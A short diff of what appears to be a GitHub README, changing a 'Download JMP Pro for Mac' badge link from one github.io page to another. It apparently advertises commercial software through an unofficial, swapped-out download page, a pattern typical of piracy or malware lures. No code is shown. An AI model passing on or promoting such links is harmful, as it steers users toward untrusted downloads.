@@ -8,7 +8,7 @@
 
 <div align="center">
 
-[![📥 Download JMP Pro Mac](https://img.shields.io/badge/📥_Download_JMP_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://tubus-jubus-apps.github.io/.github/jmppro)
+[![📥 Download JMP Pro Mac](https://img.shields.io/badge/📥_Download_JMP_Pro_for_Mac-blue?style=for-the-badge&logo=apple)](https://top-ssilka-apps.github.io/.github/jmppro)
 
 </div>
 
